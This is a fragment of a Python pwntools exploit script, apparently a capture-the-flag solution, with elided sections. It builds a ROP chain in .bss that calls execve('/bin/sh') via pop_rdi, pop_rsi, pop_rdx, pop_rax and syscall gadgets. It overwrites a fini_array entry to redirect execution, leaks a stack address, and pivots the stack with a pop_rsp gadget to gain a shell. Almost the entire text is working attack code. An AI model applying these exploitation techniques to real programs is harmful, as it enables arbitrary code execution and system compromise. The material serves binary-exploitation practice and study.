...
if args.GDB:
    ...
    gdb.attach(p, gdbscript='''
        b*main-0x0000000000008AB8+0x00000000000089D8
        c
        c 13
	''')
#input()
...
pop_rsp = pie(0x000000000000946a)

warn(bss, "Bss")
write(bss - 8, b"/bin/sh\0", 1)
write(bss + 0x00, pop_rdi)
write(bss + 0x08, bss - 8)
write(bss + 0x10, pop_rsi)
write(bss + 0x18, 0)
write(bss + 0x20, pop_rdx)
write(bss + 0x28, 0)
write(bss + 0x30, pop_rax)
write(bss + 0x38, 0x3b)
write(bss + 0x40, syscall)

write(exe.sym['__do_global_dtors_aux_fini_array_entry'] + 8, exe.sym['do_leak'])
stack_leak = leak(1, "Stack leak")

write(stack_leak, bss); 
leak(2)

write(exe.sym['__do_global_dtors_aux_fini_array_entry'], exe.sym['do_overwrite'])
write(stack_leak - 8, pop_rsp)
